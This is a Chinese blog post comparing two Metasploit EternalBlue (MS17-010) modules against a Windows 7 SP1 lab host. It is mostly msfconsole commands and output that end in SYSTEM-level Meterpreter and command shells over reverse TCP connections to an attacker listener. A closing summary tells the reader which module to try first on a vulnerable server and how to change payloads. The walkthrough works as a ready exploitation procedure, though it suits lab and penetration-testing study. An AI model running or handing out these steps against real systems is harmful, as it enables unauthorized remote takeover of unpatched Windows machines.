---
layout: post
title: Metasploit 「永恒之蓝」两种模块的利弊
comments: false
description: ""
keywords: "Tricks"
---

永恒之蓝，在metasploit中有两个利用模块，针对不同系统，可以灵活使用；

## 搜索一下

```
msf > search ms17-010
Matching Modules
================
   Name                                      Disclosure Date  Rank     Description
   ----                                      ---------------  ----     -----------
   auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   auxiliary/scanner/smb/smb_ms17_010                         normal   MS17-010 SMB RCE Detection
   exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
```

其利用模块为：初始的`exploit/windows/smb/ms17_010_eternalblue`，最近的`exploit/windows/smb/ms17_010_psexec`

## Win7

这里仅拿 Win7 旗舰版 SP1 做实例，其余同理；

1、首先测试最新的模块：`exploit/windows/smb/ms17_010_psexec`，其在metasploit的github上宣称测试了近乎所有Windows版本主机，均可成功；

```
msf > use exploit/windows/smb/ms17_010_psexec
msf exploit(windows/smb/ms17_010_psexec) > set rhost 192.168.43.103
rhost => 192.168.43.103
msf exploit(windows/smb/ms17_010_psexec) > show options 
Module options (exploit/windows/smb/ms17_010_psexec):
   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   DBGTRACE              false            yes       Show extra debug trace info
   LEAKATTEMPTS          99               yes       How many times to try to leak transaction
   NAMEDPIPE                              no        A named pipe that can be connected to (leave blank for auto)
   RHOST                 192.168.43.103   yes       The target address
   RPORT                 445              yes       The Target port
   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SHARE                 ADMIN$           yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass                                no        The password for the specified username
   SMBUser                                no        The username to authenticate as
Payload options (windows/meterpreter/reverse_tcp):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.43.100   yes       The listen address
   LPORT     4444             yes       The listen port
Exploit target:
   Id  Name
   --  ----
   0   Automatic
msf exploit(windows/smb/ms17_010_psexec) > exploit 
[*] Started reverse TCP handler on 192.168.43.100:4444 
[-] 192.168.43.103:445 - Rex::Proto::SMB::Exceptions::LoginError: Login Failed: The server responded with error: STATUS_LOGON_FAILURE (Command=115 WordCount=0)
[*] Exploit completed, but no session was created.
```

发现利用失败，提示`LoginError`，这里就需要注意一个点：

这台服务器需指定SMBPass和SMBUser来建立windows可访问命名管道[accessible named pipe]。

什么意思？就是需要服务器当前用户的账号和密码；

这会不会就很尴尬...

那就设置账号密码测试一下：

```
msf exploit(windows/smb/ms17_010_psexec) > set smbuser xxxx
smbuser => xxxx
msf exploit(windows/smb/ms17_010_psexec) > set smbpass xxxx
smbpass => xxxx
msf exploit(windows/smb/ms17_010_psexec) > exploit 
[*] Started reverse TCP handler on 192.168.43.100:4444 
[*] 192.168.43.103:445 - Target OS: Windows 7 Ultimate 7601 Service Pack 1
[*] 192.168.43.103:445 - Built a write-what-where primitive...
[+] 192.168.43.103:445 - Overwrite complete... SYSTEM session obtained!
[*] 192.168.43.103:445 - Selecting PowerShell target
[*] 192.168.43.103:445 - Executing the payload...
[+] 192.168.43.103:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (179779 bytes) to 192.168.43.103
[*] Meterpreter session 3 opened (192.168.43.100:4444 -> 192.168.43.103:49222) at 2018-03-14 12:03:56 +0800

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

不仅利用成功，而且还是system权限，因为使用的是管理的账号密码，即服务器上用管理权限来使用的SMB服务；

如果不知道账号密码，是不是就gg了？

2、采用初始的模块：`exploit/windows/smb/ms17_010_eternalblue`

```
msf > use exploit/windows/smb/ms17_010_eternalblue
msf exploit(windows/smb/ms17_010_eternalblue) > set rhost 192.168.43.103
rhost => 192.168.43.103
msf exploit(windows/smb/ms17_010_eternalblue) > exploit 
[*] Started reverse TCP handler on 192.168.43.100:4444 
[*] 192.168.43.103:445 - Connecting to target for exploitation.
[+] 192.168.43.103:445 - Connection established for exploitation.
[+] 192.168.43.103:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.43.103:445 - CORE raw buffer dump (38 bytes)
[*] 192.168.43.103:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
[*] 192.168.43.103:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service 
[*] 192.168.43.103:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1          
[+] 192.168.43.103:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.43.103:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.43.103:445 - Sending all but last fragment of exploit packet
[*] 192.168.43.103:445 - Starting non-paged pool grooming
[+] 192.168.43.103:445 - Sending SMBv2 buffers
[+] 192.168.43.103:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.43.103:445 - Sending final SMBv2 buffers.
[*] 192.168.43.103:445 - Sending last fragment of exploit packet!
[*] 192.168.43.103:445 - Receiving response from exploit packet
[+] 192.168.43.103:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.43.103:445 - Sending egg to corrupted connection.
[*] 192.168.43.103:445 - Triggering free of corrupted buffer.
[*] Command shell session 5 opened (192.168.43.100:4444 -> 192.168.43.103:49271) at 2018-03-14 12:21:12 +0800
[+] 192.168.43.103:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.43.103:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.43.103:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

Microsoft Windows [?汾 6.1.7601]
??Ȩ???? (c) 2009 Microsoft Corporation??????????Ȩ????

C:\Windows\system32>whoami
whoami
nt authority\system
```

同一台服务器，这个模块并不需要提供用户名及密码...

## 总结

当发现一台服务器存在永恒之蓝漏洞的时候：

1、首先测试最新的模块：`exploit/windows/smb/ms17_010_psexec`；

2、如果利用失败，提示Login失败或者需要指定Windows可授权命名管道，即需要指定SMBUser及SMBPass时，可以尝试原始的利用模块：`exploit/windows/smb/ms17_010_eternalblue`，但也不是完美的，有些版本也会出现要求指定SMBUser及SMBPass；

3、github上也有一些师傅公开的msf利用模块，也可以加以利用；

BTW、默认ms17_010_eternalblue模块使用的payload是shell_bind_tcp，正向tcp反弹，导致利用成功会直接进入shell，这里无论怎么退出【exit或者直接关闭shell】，服务器都会出现重启，这就需要指定模块的payload，常用`windows/x64/meterpreter/reverse_tcp`，设置好本地ip及端口即可，实现反向反弹meterpreter，但同样，关闭shell仍然会导致服务器重启，蜜汁尴尬；

```
msf > use exploit/windows/smb/ms17_010_eternalblue
msf exploit(windows/smb/ms17_010_eternalblue) > set rhost 192.168.43.103
rhost => 192.168.43.103
msf exploit(windows/smb/ms17_010_eternalblue) > show payloads 
Compatible Payloads
===================
   Name                                        Disclosure Date  Rank    Description
   ----                                        ---------------  ----    -----------
   generic/custom                                               normal  Custom Payload
   generic/shell_bind_tcp                                       normal  Generic Command Shell, Bind TCP Inline
   generic/shell_reverse_tcp                                    normal  Generic Command Shell, Reverse TCP Inline
   windows/x64/exec                                             normal  Windows x64 Execute Command
   windows/x64/loadlibrary                                      normal  Windows x64 LoadLibrary Path
   windows/x64/meterpreter/bind_ipv6_tcp                        normal  Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
   windows/x64/meterpreter/bind_ipv6_tcp_uuid                   normal  Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
   windows/x64/meterpreter/bind_tcp                             normal  Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
   windows/x64/meterpreter/bind_tcp_uuid                        normal  Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)
   windows/x64/meterpreter/reverse_http                         normal  Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
   windows/x64/meterpreter/reverse_https                        normal  Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
   windows/x64/meterpreter/reverse_named_pipe                   normal  Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
   windows/x64/meterpreter/reverse_tcp                          normal  Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   windows/x64/meterpreter/reverse_tcp_uuid                     normal  Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
   windows/x64/meterpreter/reverse_winhttp                      normal  Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)
   windows/x64/meterpreter/reverse_winhttps                     normal  Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)
   windows/x64/powershell_bind_tcp                              normal  Windows Interactive Powershell Session, Bind TCP
   windows/x64/powershell_reverse_tcp                           normal  Windows Interactive Powershell Session, Reverse TCP
   windows/x64/shell/bind_ipv6_tcp                              normal  Windows x64 Command Shell, Windows x64 IPv6 Bind TCP Stager
   windows/x64/shell/bind_ipv6_tcp_uuid                         normal  Windows x64 Command Shell, Windows x64 IPv6 Bind TCP Stager with UUID Support
   windows/x64/shell/bind_tcp                                   normal  Windows x64 Command Shell, Windows x64 Bind TCP Stager
   windows/x64/shell/bind_tcp_uuid                              normal  Windows x64 Command Shell, Bind TCP Stager with UUID Support (Windows x64)
   windows/x64/shell/reverse_tcp                                normal  Windows x64 Command Shell, Windows x64 Reverse TCP Stager
   windows/x64/shell/reverse_tcp_uuid                           normal  Windows x64 Command Shell, Reverse TCP Stager with UUID Support (Windows x64)
   windows/x64/shell_bind_tcp                                   normal  Windows x64 Command Shell, Bind TCP Inline
   windows/x64/shell_reverse_tcp                                normal  Windows x64 Command Shell, Reverse TCP Inline
   windows/x64/vncinject/bind_ipv6_tcp                          normal  Windows x64 VNC Server (Reflective Injection), Windows x64 IPv6 Bind TCP Stager
   windows/x64/vncinject/bind_ipv6_tcp_uuid                     normal  Windows x64 VNC Server (Reflective Injection), Windows x64 IPv6 Bind TCP Stager with UUID Support
   windows/x64/vncinject/bind_tcp                               normal  Windows x64 VNC Server (Reflective Injection), Windows x64 Bind TCP Stager
   windows/x64/vncinject/bind_tcp_uuid                          normal  Windows x64 VNC Server (Reflective Injection), Bind TCP Stager with UUID Support (Windows x64)
   windows/x64/vncinject/reverse_http                           normal  Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (wininet)
   windows/x64/vncinject/reverse_https                          normal  Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (wininet)
   windows/x64/vncinject/reverse_tcp                            normal  Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse TCP Stager
   windows/x64/vncinject/reverse_tcp_uuid                       normal  Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager with UUID Support (Windows x64)
   windows/x64/vncinject/reverse_winhttp                        normal  Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (winhttp)
   windows/x64/vncinject/reverse_winhttps                       normal  Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTPS Stager (winhttp)

msf exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp 
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > set lhost 192.168.43.100
lhost => 192.168.43.100
msf exploit(windows/smb/ms17_010_eternalblue) > show options 
Module options (exploit/windows/smb/ms17_010_eternalblue):
   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   GroomAllocations    12               yes       Initial number of times to groom the kernel pool.
   GroomDelta          5                yes       The amount to increase the groom count by per try.
   MaxExploitAttempts  3                yes       The number of times to retry the exploit.
   ProcessName         spoolsv.exe      yes       Process to inject payload into.
   RHOST               192.168.43.103   yes       The target address
   RPORT               445              yes       The target port (TCP)
   SMBDomain           .                no        (Optional) The Windows domain to use for authentication
   SMBPass                              no        (Optional) The password for the specified username
   SMBUser                              no        (Optional) The username to authenticate as
   VerifyArch          true             yes       Check if remote architecture matches exploit Target.
   VerifyTarget        true             yes       Check if remote OS matches exploit Target.
Payload options (windows/x64/meterpreter/reverse_tcp):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.43.100   yes       The listen address
   LPORT     4444             yes       The listen port
Exploit target:
   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
msf exploit(windows/smb/ms17_010_eternalblue) > exploit 
[*] Started reverse TCP handler on 192.168.43.100:4444 
[*] 192.168.43.103:445 - Connecting to target for exploitation.
[+] 192.168.43.103:445 - Connection established for exploitation.
[+] 192.168.43.103:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.43.103:445 - CORE raw buffer dump (38 bytes)
[*] 192.168.43.103:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
[*] 192.168.43.103:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service 
[*] 192.168.43.103:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1          
[+] 192.168.43.103:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.43.103:445 - Trying exploit with 17 Groom Allocations.
[*] 192.168.43.103:445 - Sending all but last fragment of exploit packet
[*] 192.168.43.103:445 - Starting non-paged pool grooming
[+] 192.168.43.103:445 - Sending SMBv2 buffers
[+] 192.168.43.103:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.43.103:445 - Sending final SMBv2 buffers.
[*] 192.168.43.103:445 - Sending last fragment of exploit packet!
[*] 192.168.43.103:445 - Receiving response from exploit packet
[+] 192.168.43.103:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.43.103:445 - Sending egg to corrupted connection.
[*] 192.168.43.103:445 - Triggering free of corrupted buffer.
[*] Sending stage (205891 bytes) to 192.168.43.103
[*] Meterpreter session 1 opened (192.168.43.100:4444 -> 192.168.43.103:49193) at 2018-03-15 16:08:33 +0800
[+] 192.168.43.103:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.43.103:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.43.103:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```